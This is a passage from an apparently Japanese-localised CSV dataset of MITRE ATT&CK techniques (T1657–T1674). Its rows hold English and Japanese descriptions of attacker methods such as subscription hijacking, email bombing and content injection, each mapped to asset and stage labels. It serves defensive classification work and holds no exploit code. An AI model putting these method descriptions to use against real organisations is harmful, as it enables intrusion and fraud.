ビジネスメール詐欺やメール詐欺の場合、攻撃者は信頼できる組織の[なりすまし](https://attack.mitre.org/techniques/T1656)を利用する可能性がある。ソーシャルエンジニアリングが成功すると、被害者は攻撃者が管理する金融口座へ資金を送金するよう騙される。(出典: FBI-BEC) これにより、金融窃取事件において複数の被害者（侵害された口座および最終的な金銭的損失）が発生する可能性が生じる。(出典: VEC) ランサムウェアによる恐喝は、例えば敵対者が[影響を与えるためのデータ暗号化](https://attack.mitre.org/techniques/T1486) （引用元：NYT-Colonial）や[データ流出](https://attack.mitre.org/tactics/TA0010)の後、支払いがなされない限り機密データを公開すると脅迫する場合です（引用元：Mandiant-leaks）。攻撃者は専用のリークサイトを利用して被害者データを拡散させる可能性があります。(出典: Crowdstrike-leaks) 金銭窃取がもたらす潜在的な甚大な事業影響を利用し、敵対者は金銭的利益追求の可能性を悪用して、[データ破壊](https://attack.mitre.org/techniques/T1485)や事業妨害といった真の目的から注意をそらす場合がある。(出典: AP-NotPetya),impact,Linux;macOS;Windows;SaaS;Office Suite,data_exfiltration,impact,mfa_in_use;user_interaction;network_connectivity;email_infrastructure,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--851e071f-208d-4c79-adc6-5974c85c78f3,2023-08-18T20:50:04.222Z,2025-04-15T22:36:03.465Z,,,,
T1659,,Content Injection,コンテンツ注入,"Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer) Adversaries may inject content to victim systems in various ways, including: * From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM) * From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide) Content injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with ""lawful interception.""(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",敵対者は、オンラインネットワークトラフィックを介してシステムに悪意のあるコンテンツを注入することで、被害者にアクセスし、継続的に通信を行う可能性があります。 被害者を侵害されたウェブサイト上の悪意あるペイロードへ誘導する手法（例：[ドライブバイ攻撃対象](https://attack.mitre.org/techniques/T1608/004) 後の[ドライブバイ侵害](https://attack.mitre.org/techniques/T1189)）ではなく、 攻撃者は、トラフィックを操作したり独自のコンテンツを注入したりできる侵害されたデータ転送チャネルを通じて、最初に被害者にアクセスする場合がある。 こうした侵害されたオンラインネットワークチャネルは、追加ペイロード（例：[侵入ツール転送](https://attack.mitre.org/techniques/T1105)）やその他のデータを既に侵害されたシステムへ配信するためにも利用される可能性がある。（引用元：ESET MoustachedBouncer）攻撃者は以下のような様々な方法で被害者システムへコンテンツを注入する： * 中間地点からの注入：攻撃者が正当なオンラインクライアント-サーバー通信の間に位置する場合（**注：**これは類似しているが、企業環境内でのみAiTM活動を記述する[中間者攻撃（Adversary-in-the-Middle）](https://attack.mitre.org/techniques/T1557)とは異なる） (引用元: Kaspersky Encyclopedia MiTM)* サイド攻撃：悪意あるコンテンツを注入し、正当なオンラインサーバーへのリクエストに対する偽の応答としてクライアントに先行して到達させる手法（引用元: Kaspersky ManOnTheSide）コンテンツ注入は、多くの場合、上流通信チャネル（例：インターネットサービスプロバイダー（ISP）レベル）の侵害が原因で発生します。これは「合法的傍受」の場合と同様です。(引用元: Kaspersky ManOnTheSide)(引用元: ESET MoustachedBouncer)(引用元: EFF China GitHub Attack),initial-access;command-and-control,Linux;macOS;Windows,data_exfiltration,remote_control,user_interaction;network_connectivity,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S1;S4,S1,C01;C04,Initial Access;Final Impact,C01,Initial Access,TA0001;TA0011,attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c,2023-09-01T21:03:13.406Z,2025-04-15T22:10:29.343Z,,,,
T1665,,Hide Infrastructure,インフラの隠蔽,"Adversaries may manipulate network traffic in order to hide and evade detection of their C2 infrastructure. This can be accomplished in various ways including by identifying and filtering traffic from defensive tools,(Citation: TA571) masking malicious domains to obfuscate the true destination from both automated scanning tools and security researchers,(Citation: Schema-abuse)(Citation: Facad1ng)(Citation: Browser-updates) and otherwise hiding malicious artifacts to delay discovery and prolong the effectiveness of adversary infrastructure that could otherwise be identified, blocked, or taken down entirely. C2 networks may include the use of [Proxy](https://attack.mitre.org/techniques/T1090) or VPNs to disguise IP addresses, which can allow adversaries to blend in with normal network traffic and bypass conditional access policies or anti-abuse protections. For example, an adversary may use a virtual private cloud to spoof their IP address to closer align with a victim's IP address ranges. This may also bypass security measures relying on geolocation of the source IP address.(Citation: sysdig)(Citation: Orange Residential Proxies) Adversaries may also attempt to filter network traffic in order to evade defensive tools in numerous ways, including blocking/redirecting common incident responder or security appliance user agents.(Citation: mod_rewrite)(Citation: SocGholish-update) Filtering traffic based on IP and geo-fencing may also avoid automated sandboxing or researcher activity (i.e., [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)).(Citation: TA571)(Citation: mod_rewrite) Hiding C2 infrastructure may also be supported by [Resource Development](https://attack.mitre.org/tactics/TA0042) activities such as [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) and [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584). For example, using widely trusted hosting services or domains such as prominent URL shortening providers or marketing services for C2 networks may enable adversaries to present benign content that later redirects victims to malicious web pages or infrastructure once specific conditions are met.(Citation: StarBlizzard)(Citation: QR-cofense)",攻撃者は、C2インフラの検出を回避・隠蔽するためネットワークトラフィックを操作することがある。これには防御ツールからのトラフィックを特定・フィルタリングする手法や、(引用: TA571) 自動スキャンツールやセキュリティ研究者から真の宛先を隠蔽するための悪意あるドメインのマスク化(引用: Schema-abuse)(引用: Facad1ng)(引用: Browser-updates)、および悪意あるアーティファクトを隠蔽して発見を遅延させ、特定・遮断・完全な停止を免れることで敵対者インフラの効果を長期化させる手法などである。 C2ネットワークでは、IPアドレスを偽装するために[プロキシ](https://attack.mitre.org/techniques/T1090)やVPNが使用される場合があり、これにより攻撃者は通常のネットワークトラフィックに紛れ込み、条件付きアクセスポリシーや不正利用防止対策を回避できる。例えば、仮想プライベートクラウドを利用してIPアドレスを偽装し、被害者のIPアドレス範囲に近づける手法が挙げられる。 これにより、送信元IPアドレスの地理的位置情報に依存するセキュリティ対策も回避される可能性があります。(引用元: sysdig)(引用元: Orange Residential Proxies) 攻撃者はまた、防御ツールを回避するため、ネットワークトラフィックのフィルタリングを試みる場合があります。これには、一般的なインシデントレスポンダーやセキュリティアプライアンスのユーザーエージェントのブロック/リダイレクトなど、様々な手法が含まれます。(引用元: mod_rewrite)(引用元: SocGholish-update) IPやジオフェンシングに基づくトラフィックフィルタリングは、自動化されたサンドボックス化や調査員の活動（例: [仮想化/サンドボックス回避](https://attack.mitre.org/techniques/T1497)）を回避する可能性もある。(引用: TA571)(引用: mod_rewrite) C2 インフラの隠蔽は、[リソース開発](https://attack.mitre.org/tactics/TA0042) 活動（例：[インフラ取得](https://attack.mitre.org/techniques/T1583) や [インフラ侵害](https://attack.mitre.org/techniques/T1584)）によっても支援される可能性があります。 例えば、著名なURL短縮プロバイダーやマーケティングサービスなど、広く信頼されているホスティングサービスやドメインをC2ネットワークに使用することで、攻撃者は、特定の条件が満たされた後に被害者を悪意のあるWebページやインフラストラクチャにリダイレクトする、一見無害なコンテンツを提示することが可能になる。(引用: StarBlizzard)(引用: QR-cofense),command-and-control,Linux;Network Devices;Windows;macOS;ESXi,remote_service_abuse,remote_control,user_interaction;network_connectivity;cloud_control_plane,specified,Business Workstation;Network Device (FW/Proxy/AP);Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--eb897572-8979-4242-a089-56f294f4c91d,2024-02-13T17:00:00.175Z,2025-04-15T19:59:18.948Z,,,,
T1666,,Modify Cloud Resource Hierarchy,クラウドリソース階層の変更,"Adversaries may attempt to modify hierarchical structures in infrastructure-as-a-service (IaaS) environments in order to evade defenses. IaaS environments often group resources into a hierarchy, enabling improved resource management and application of policies to relevant groups. Hierarchical structures differ among cloud providers. For example, in AWS environments, multiple accounts can be grouped under a single organization, while in Azure environments, multiple subscriptions can be grouped under a single management group.(Citation: AWS Organizations)(Citation: Microsoft Azure Resources) Adversaries may add, delete, or otherwise modify resource groups within an IaaS hierarchy. For example, in Azure environments, an adversary who has gained access to a Global Administrator account may create new subscriptions in which to deploy resources. They may also engage in subscription hijacking by transferring an existing pay-as-you-go subscription from a victim tenant to an adversary-controlled tenant. This will allow the adversary to use the victim’s compute resources without generating logs on the victim tenant.(Citation: Microsoft Peach Sandstorm 2023)(Citation: Microsoft Subscription Hijacking 2022) In AWS environments, adversaries with appropriate permissions in a given account may call the `LeaveOrganization` API, causing the account to be severed from the AWS Organization to which it was tied and removing any Service Control Policies, guardrails, or restrictions imposed upon it by its former Organization. Alternatively, adversaries may call the `CreateAccount` API in order to create a new account within an AWS Organization. This account will use the same payment methods registered to the payment account but may not be subject to existing detections or Service Control Policies.(Citation: AWS RE:Inforce Threat Detection 2024)",攻撃者は防御を回避するため、IaaS（Infrastructure-as-a-Service）環境における階層構造の変更を試みる可能性がある。IaaS環境ではリソースを階層的にグループ化することが多く、これによりリソース管理の効率化や関連グループへのポリシー適用が可能となる。 階層構造はクラウドプロバイダーによって異なる。例えばAWS環境では複数のアカウントを単一の組織下にグループ化できる一方、Azure環境では複数のサブスクリプションを単一の管理グループ下にグループ化できる。（引用元：AWS Organizations）（引用元：Microsoft Azure Resources）攻撃者はIaaS階層内のリソースグループを追加・削除・変更する可能性がある。 例えばAzure環境では、グローバル管理者アカウントへのアクセス権を取得した攻撃者は、リソースを展開するための新規サブスクリプションを作成できる。また、被害テナントから攻撃者管理テナントへ既存の従量課金制サブスクリプションを移管する「サブスクリプションハイジャック」を実行する可能性もある。これにより攻撃者は、被害テナントにログを残さずに被害者のコンピューティングリソースを利用できる。(引用元: Microsoft Peach Sandstorm 2023)(引用元: Microsoft Subscription Hijacking 2022) AWS環境では、特定アカウントで適切な権限を持つ攻撃者が`LeaveOrganization` APIを呼び出すことで、そのアカウントを紐付けられていたAWS Organizationから切り離し、元のOrganizationによって課されていたサービス制御ポリシー、ガードレール、制限を解除できます。 あるいは、攻撃者は`CreateAccount` APIを呼び出してAWS Organization内に新規アカウントを作成する可能性があります。このアカウントは支払いアカウントに登録された支払い方法を引き継ぎますが、既存の検知機能やサービス制御ポリシーの対象外となる場合があります。(引用元: AWS RE:Inforce Threat Detection 2024),defense-evasion,IaaS,script_command_execution,stealth,privileged_account;endpoint_execution;cloud_control_plane;logging_monitoring,specified,Log / Monitoring Server,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--0ce73446-8722-4086-9d43-514f1d0f669e,2024-09-25T14:16:19.234Z,2025-04-15T22:49:45.874Z,,,,
T1667,,Email Bombing,メール爆弾攻撃,"Adversaries may flood targeted email addresses with an overwhelming volume of messages. This may bury legitimate emails in a flood of spam and disrupt business operations.(Citation: sophos-bombing)(Citation: krebs-email-bombing) An adversary may accomplish email bombing by leveraging an automated bot to register a targeted address for e-mail lists that do not validate new signups, such as online newsletters. The result can be a wave of thousands of e-mails that effectively overloads the victim’s inbox.(Citation: krebs-email-bombing)(Citation: hhs-email-bombing) By sending hundreds or thousands of e-mails in quick succession, adversaries may successfully divert attention away from and bury legitimate messages including security alerts, daily business processes like help desk tickets and client correspondence, or ongoing scams.(Citation: hhs-email-bombing) This behavior can also be used as a tool of harassment.(Citation: krebs-email-bombing) This behavior may be a precursor for [Spearphishing Voice](https://attack.mitre.org/techniques/T1566/004). For example, an adversary may email bomb a target and then follow up with a phone call to fraudulently offer assistance. This social engineering may lead to the use of [Remote Access Software](https://attack.mitre.org/techniques/T1663) to steal credentials, deploy ransomware, conduct [Financial Theft](https://attack.mitre.org/techniques/T1657)(Citation: sophos-bombing), or engage in other malicious activity.(Citation: rapid7-email-bombing)",攻撃者は標的のメールアドレスに対し、膨大な量のメッセージを送りつけて氾濫させる可能性がある。これにより正当なメールがスパムの洪水に埋もれ、業務が妨害される。(引用: sophos-bombing)(引用: krebs-email-bombing) 攻撃者は自動化されたボットを活用し、新規登録を検証しないメールリスト（オンラインニュースレターなど）に標的のアドレスを登録させることでメール爆弾攻撃を実行する可能性がある。 その結果、被害者の受信箱を事実上オーバーロードさせる数千通のメールが押し寄せることがある。(引用: krebs-email-bombing)(引用: hhs-email-bombing) 敵対者は数百～数千通のメールを短時間で連続送信することで、セキュリティアラート、ヘルプデスクチケットや顧客対応といった日常業務プロセス、進行中の詐欺など、正当なメッセージへの注意をそらし埋没させることに成功する可能性がある。(引用: hhs-email-bombing) この行為は嫌がらせの手段としても利用される。(引用: krebs-email-bombing) また[スピアフィッシング音声](https://attack.mitre.org/techniques/T1566/004)の前段階となる可能性がある。 例えば、攻撃者は標的にメール爆弾を仕掛けた後、電話で偽りの支援を申し出る場合があります。このソーシャルエンジニアリングは、[リモートアクセスソフトウェア](https://attack.mitre.org/techniques/T1663) を使用した認証情報の窃取、ランサムウェアの展開、[金融窃盗](https://attack.mitre.org/techniques/T1657)（引用元: sophos-bombing）、あるいはその他の悪意ある活動を行う可能性があります（引用元: rapid7-email-bombing）。,impact,Linux;Office Suite;Windows;macOS,credential_abuse,impact,authentication_system;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;logging_monitoring,specified,Business Workstation;File Server;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;My Number Administrative System on GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0040,attack-pattern--bed81616-3dde-4685-be6e-ba9820f9a7ed,2025-01-31T14:39:58.478Z,2025-04-15T19:59:03.350Z,,,,
T1668,,Exclusive Control,排他的制御,"Adversaries who successfully compromise a system may attempt to maintain persistence by “closing the door Ebehind them  Ein other words, by preventing other threat actors from initially accessing or maintaining a foothold on the same system. For example, adversaries may patch a vulnerable, compromised system(Citation: Mandiant-iab-control)(Citation: CERT AT Fortinent Ransomware 2025) to prevent other threat actors from leveraging that vulnerability in the future. They may “close the door Ein other ways, such as disabling vulnerable services(Citation: sophos-multiple-attackers), stripping privileges from accounts(Citation: aquasec-postgres-processes), or removing other malware already on the compromised device.(Citation: fsecure-netsky) Hindering other threat actors may allow an adversary to maintain sole access to a compromised system or network. This prevents the threat actor from needing to compete with or even being removed themselves by other threat actors. It also reduces the “noise Ein the environment, lowering the possibility of being caught and evicted by defenders. Finally, in the case of [Resource Hijacking](https://attack.mitre.org/techniques/T1496), leveraging a compromised device’s full power allows the threat actor to maximize profit.(Citation: sophos-multiple-attackers)",システムへの侵入に成功した攻撃者は、他の脅威アクターが同じシステムに最初にアクセスしたり、足場を維持したりすることを防ぐことで、永続性を維持しようと試みる場合があります。 例えば、攻撃者は脆弱な侵害済みシステムにパッチを適用し（引用元：Mandiant-iab-control）（引用元：CERT AT Fortinent Ransomware 2025）、他の脅威アクターが将来その脆弱性を悪用するのを防ぐ場合があります。 彼らは、脆弱なサービスを無効化(引用: sophos-multiple-attackers)、アカウントの権限を剥奪(引用: aquasec-postgres-processes)、または侵害されたデバイス上に既に存在する他のマルウェアを除去する(引用: fsecure-netsky)など、他の方法で「扉を閉める」こともある。他の脅威アクターを妨害することで、敵対者は侵害されたシステムやネットワークへの独占的なアクセスを維持できる可能性がある。 これにより、脅威アクターは他の脅威アクターとの競争を避け、自ら排除されるリスクも低減できます。また環境内の「ノイズ」を減少させ、防御者による検知・排除の可能性を低下させます。 最後に、[リソースハイジャック](https://attack.mitre.org/techniques/T1496) の場合、侵害されたデバイスの全能力を活用することで、脅威アクターは利益を最大化できます。(引用元: sophos-multiple-attackers),persistence,Linux;macOS;Windows,destructive_impact,foothold,endpoint_execution;network_connectivity;database_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--dff263cc-328e-42b4-afbc-1fee8b6a8913,2025-01-31T15:22:39.317Z,2025-04-15T19:59:14.622Z,,,,
T1669,,Wi-Fi Networks,Wi-Fiネットワーク,"Adversaries may gain initial access to target systems by connecting to wireless networks. They may accomplish this by exploiting open Wi-Fi networks used by target devices or by accessing secured Wi-Fi networks  Erequiring [Valid Accounts](https://attack.mitre.org/techniques/T1078)  Ebelonging to a target organization.(Citation: DOJ GRU Charges 2018)(Citation: Nearest Neighbor Volexity) Establishing a connection to a Wi-Fi access point requires a certain level of proximity to both discover and maintain a stable network connection. Adversaries may establish a wireless connection through various methods, such as by physically positioning themselves near a Wi-Fi network to conduct close access operations. To bypass the need for physical proximity, adversaries may attempt to remotely compromise nearby third-party systems that have both wired and wireless network connections available (i.e., dual-homed systems). These third-party compromised devices can then serve as a bridge to connect to a target’s Wi-Fi network.(Citation: Nearest Neighbor Volexity) Once an initial wireless connection is achieved, adversaries may leverage this access for follow-on activities in the victim network or further targeting of specific devices on the network. Adversaries may perform [Network Sniffing](https://attack.mitre.org/techniques/T1040) or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) activities for [Credential Access](https://attack.mitre.org/tactics/TA0006) or [Discovery](https://attack.mitre.org/tactics/TA0007).",攻撃者は無線ネットワークへの接続を通じて標的システムへの初期アクセスを獲得する可能性がある。これには標的デバイスが使用する開放型Wi-Fiネットワークの悪用、あるいは標的組織に属する[有効なアカウント](https://attack.mitre.org/techniques/T1078)を必要とする保護されたWi-Fiネットワークへのアクセスが含まれる。(引用: DOJ GRU Charges 2018)(引用: Nearest Neighbor Volexity)Wi-Fi アクセスポイントへの接続を確立するには、ネットワーク接続を検出および維持するために、ある程度の近接性が必要です。 攻撃者は、物理的にWi-Fiネットワークの近くに配置して近接アクセス操作を行うなど、様々な方法で無線接続を確立する可能性がある。物理的な近接性を回避するため、攻撃者は有線・無線両方のネットワーク接続が可能な近隣の第三者システム（デュアルホームシステム）を遠隔で侵害しようとする場合がある。こうして侵害された第三者デバイスは、標的のWi-Fiネットワークへの接続ブリッジとして機能し得る。（引用元：Nearest Neighbor Volexity）初期無線接続が確立されると、攻撃者はこのアクセス権を悪用し、被害者ネットワーク内での追跡活動やネットワーク上の特定デバイスへのさらなる標的化を行う可能性があります。攻撃者は[ネットワークスニッフィング](https://attack.mitre.org/techniques/T1040)や [中間者攻撃](https://attack.mitre.org/techniques/T1557)を実施し、[認証情報の取得](https://attack.mitre.org/tactics/TA0006)や[探索](https://attack.mitre.org/tactics/TA0007)を行う可能性があります。,initial-access,Linux;Network Devices;Windows;macOS,credential_abuse,entry,authentication_system;network_connectivity,specified,Business Workstation;Network Device (FW/Proxy/AP);Server (On-Prem/VM);Wireless Access Point,has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--fde016f6-211a-41c8-a4ab-301f1e419c62,2025-02-25T15:49:33.963Z,2025-04-15T19:59:24.690Z,,,,
T1671,,Cloud Application Integration,クラウドアプリケーション統合,"Adversaries may achieve persistence by leveraging OAuth application integrations in a software-as-a-service environment. Adversaries may create a custom application, add a legitimate application into the environment, or even co-opt an existing integration to achieve malicious ends.(Citation: Push Security SaaS Persistence 2022)(Citation: SaaS Attacks GitHub Evil Twin Integrations) OAuth is an open standard that allows users to authorize applications to access their information on their behalf. In a SaaS environment such as Microsoft 365 or Google Workspace, users may integrate applications to improve their workflow and achieve tasks. Leveraging application integrations may allow adversaries to persist in an environment  Efor example, by granting consent to an application from a high-privileged adversary-controlled account in order to maintain access to its data, even in the event of losing access to the account.(Citation: Wiz Midnight Blizzard 2024)(Citation: Microsoft Malicious OAuth Applications 2022)(Citation: Huntress Persistence Microsoft 365 Compromise 2024) In some cases, integrations may remain valid even after the original consenting user account is disabled.(Citation: Push Security Slack Persistence 2023) Application integrations may also allow adversaries to bypass multi-factor authentication requirements through the use of [Application Access Token](https://attack.mitre.org/techniques/T1550/001)s. Finally, they may enable persistent [Automated Exfiltration](https://attack.mitre.org/techniques/T1020) over time.(Citation: Synes Cyber Corner Malicious Azure Application 2023) Creating or adding a new application may require the adversary to create a dedicated [Cloud Account](https://attack.mitre.org/techniques/T1136/003) for the application and assign it [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)  Efor example, in Microsoft 365 environments, an application can only access resources via an associated service principal.(Citation: Microsoft Entra ID Service Principals)",攻撃者は、SaaS 環境における OAuth アプリケーション統合を悪用して永続性を達成する可能性があります。 攻撃者は、カスタムアプリケーションを作成したり、正当なアプリケーションを環境に追加したり、既存の統合を悪用して悪意のある目的を達成する可能性があります。(引用: Push Security SaaS Persistence 2022)(引用: SaaS Attacks GitHub Evil Twin Integrations)OAuth は、ユーザーがアプリケーションに自身に代わって情報にアクセスする権限を付与することを可能にするオープンスタンダードです。 Microsoft 365やGoogle WorkspaceなどのSaaS環境では、ユーザーはワークフローの改善やタスク達成のためにアプリケーションを統合することがあります。アプリケーション統合の悪用により、攻撃者は環境内に永続化を図ることが可能です。例えば、高権限を持つ攻撃者管理アカウントからアプリケーションへの同意を付与することで、アカウントへのアクセス権を失った場合でもデータへのアクセスを維持できます。(引用元: Wiz Midnight Blizzard 2024)(引用元: Microsoft Malicious OAuth Applications 2022)(引用元: Huntress Persistence Microsoft 365 Compromise 2024) 場合によっては、元の同意ユーザーアカウントが無効化されても統合が有効なまま残る可能性があります。(引用: Push Security Slack Persistence 2023) アプリケーション統合により、攻撃者は[アプリケーションアクセストークン](https://attack.mitre.org/techniques/T1550/001)を利用して多要素認証要件を迂回できる場合もある。 最終的には、時間をかけて持続的な[自動化された情報漏洩](https://attack.mitre.org/techniques/T1020)を可能にする可能性があります。(引用元: Synes Cyber Corner Malicious Azure Application 2023) 新規アプリケーションの作成または追加には、攻撃者がそのアプリケーション専用の[クラウドアカウント](https://attack.mitre.org/techniques/T1136/003)を作成し、[追加のクラウドロール](https://attack.mitre.org/techniques/T1098/003)を割り当てる必要がある場合があります。  例えばMicrosoft 365環境では、アプリケーションは関連付けられたサービスプリンシパル経由でのみリソースにアクセス可能である。（引用元：Microsoft Entra ID Service Principals）,persistence,SaaS;Office Suite,credential_abuse,foothold,authentication_system;mfa_in_use;identity_federation;privileged_account;user_interaction;cloud_control_plane;saas_in_use,specified,Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud,has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0003,attack-pattern--c31aebd6-c9b5-420f-ba2a-5853bbf897fa,2025-03-20T22:21:59.326Z,2025-04-15T19:59:05.283Z,,,,
T1672,,Email Spoofing,メールスプーフィング,"Adversaries may fake, or spoof, a sender’s identity by modifying the value of relevant email headers in order to establish contact with victims under false pretenses.(Citation: Proofpoint TA427 April 2024) In addition to actual email content, email headers (such as the FROM header, which contains the email address of the sender) may also be modified. Email clients display these headers when emails appear in a victim's inbox, which may cause modified emails to appear as if they were from the spoofed entity. This behavior may succeed when the spoofed entity either does not enable or enforce identity authentication tools such as Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and/or Domain-based Message Authentication, Reporting and Conformance (DMARC).(Citation: Cloudflare DMARC, DKIM, and SPF)(Citation: DMARC-overview)(Citation: Proofpoint-DMARC) Even if SPF and DKIM are configured properly, spoofing may still succeed when a domain sets a weak DMARC policy such as `v=DMARC1; p=none; fo=1;`. This means that while DMARC is technically present, email servers are not instructed to take any filtering action when emails fail authentication checks.(Citation: Proofpoint TA427 April 2024)(Citation: ic3-dprk) Adversaries may abuse absent or weakly configured SPF, SKIM, and/or DMARC policies to conceal social engineering attempts(Citation: ic3-dprk) such as [Phishing](https://attack.mitre.org/techniques/T1566). They may also leverage email spoofing for [Impersonation](https://attack.mitre.org/techniques/T1656) of legitimate external individuals and organizations, such as journalists and academics.(Citation: ic3-dprk)","攻撃者は、偽りの口実で被害者と接触するために、関連するメールヘッダーの値を改変し、送信者の身元を偽装（スプーフィング）することがあります。(引用元: Proofpoint TA427 2024年4月)実際のメール本文に加え、メールヘッダー（送信者のメールアドレスを含むFROMヘッダーなど）も改変される可能性があります。 電子メールクライアントは、被害者の受信トレイに電子メールが表示されたときにこれらのヘッダーを表示するため、変更された電子メールは、偽装されたエンティティから送信されたもののように見える可能性があります。 この行為は、なりすましの対象となる組織が、送信者ポリシーフレームワーク（SPF）、ドメインキー認証メール（DKIM）、および／またはドメインベースメッセージ認証・報告・準拠（DMARC）などの身元認証ツールを有効化または適用していない場合に成功する可能性があります。（引用元：Cloudflare DMARC, DKIM, and SPF）（引用元：DMARC-overview）（引用元：Proofpoint-DMARC） SPFとDKIMが適切に設定されていても、ドメインが`v=DMARC1; p=none; fo=1;`のような脆弱なDMARCポリシーを設定している場合、なりすましは成功する可能性があります。これは、DMARCが技術的には存在しているものの、メールサーバーが認証チェックに失敗したメールに対してフィルタリング措置を取るよう指示されていないことを意味します。(引用元: Proofpoint TA427 2024年4月)(引用元: ic3-dprk) 攻撃者は、SPF、SKIM、DMARCポリシーが設定されていない、または弱く設定されていることを悪用し、[フィッシング](https://attack.mitre.org/techniques/T1566)などのソーシャルエンジニアリング攻撃を隠蔽する可能性があります(引用元: ic3-dprk)。 また、メールスプーフィングを利用して、ジャーナリストや学者など正当な外部個人・組織の[なりすまし](https://attack.mitre.org/techniques/T1656)を行う可能性もある。(引用元: ic3-dprk)",defense-evasion,Office Suite;Windows;macOS;Linux,config_policy_manipulation,stealth,authentication_system;user_interaction;email_infrastructure;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--e1c2db92-7ae3-4e6a-90b4-157c1c1565cb,2025-03-24T16:52:14.061Z,2025-04-15T19:59:15.222Z,,,,
T1673,,Virtual Machine Discovery,仮想マシンの発見,"An adversary may attempt to enumerate running virtual machines (VMs) after gaining access to a host or hypervisor. For example, adversaries may enumerate a list of VMs on an ESXi hypervisor using a [Hypervisor CLI](https://attack.mitre.org/techniques/T1059/012) such as `esxcli` or `vim-cmd` (e.g. `esxcli vm process list or vim-cmd vmsvc/getallvms`).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)(Citation: TrendMicro Play) Adversaries may also directly leverage a graphical user interface, such as VMware vCenter, in order to view virtual machines on a host. Adversaries may use the information from [Virtual Machine Discovery](https://attack.mitre.org/techniques/T1673) during discovery to shape follow-on behaviors. Subsequently discovered VMs may be leveraged for follow-on activities such as [Service Stop](https://attack.mitre.org/techniques/T1489) or [Data Encrypted for Impact](https://attack.mitre.org/techniques/T1486).(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)",敵対者は、ホストまたはハイパーバイザーへのアクセス権を取得した後、稼働中の仮想マシン (VM) を列挙しようとする場合があります。 例えば、敵対者は `esxcli` や `vim-cmd` などの [ハイパーバイザー CLI](https://attack.mitre.org/techniques/T1059/012) を使用して ESXi ハイパーバイザー上の VM リストを列挙する可能性があります（例: `esxcli vm process list` または `vim-cmd vmsvc/getallvms`）。（引用元：Crowdstrike Hypervisor Jackpotting Pt 2 2021）（引用元：TrendMicro Play）また、攻撃者は、VMware vCenter などのグラフィカルユーザーインターフェイスを直接利用して、ホスト上の仮想マシンを表示することもできます。 敵対者は、発見中に [仮想マシンの発見](https://attack.mitre.org/techniques/T1673) から得た情報を使用して、その後の行動を決定する場合があります。 その後発見された仮想マシンは、[サービスの停止](https://attack.mitre.org/techniques/T1489) や [影響力のためのデータ暗号化](https://attack.mitre.org/techniques/T1486) などの後続活動に利用される可能性があります。(引用元: Crowdstrike Hypervisor Jackpotting Pt 2 2021),discovery,Linux;macOS;Windows;ESXi,destructive_impact,situational_awareness,user_interaction;endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--6bc7f9aa-b91f-4b23-84b8-5e756eba68eb,2025-03-27T15:32:17.400Z,2025-04-15T21:24:32.155Z,,,,
T1674,,Input Injection,入力注入,"Adversaries may simulate keystrokes on a victim’s computer by various means to perform any type of action on behalf of the user, such as launching the command interpreter using keyboard shortcuts, typing an inline script to be executed, or interacting directly with a GUI-based application. These actions can be preprogrammed into adversary tooling or executed through physical devices such as Human Interface Devices (HIDs). For example, adversaries have used tooling that monitors the Windows message loop to detect when a user visits bank-specific URLs. If detected, the tool then simulates keystrokes to open the developer console or select the address bar, pastes malicious JavaScript from the clipboard, and executes it - enabling manipulation of content within the browser, such as replacing bank account numbers during transactions.(Citation: BleepingComputer BackSwap)(Citation: welivesecurity BackSwap) Adversaries have also used malicious USB devices to emulate keystrokes that launch PowerShell, leading to the download and execution of malware from adversary-controlled servers.(Citation: BleepingComputer 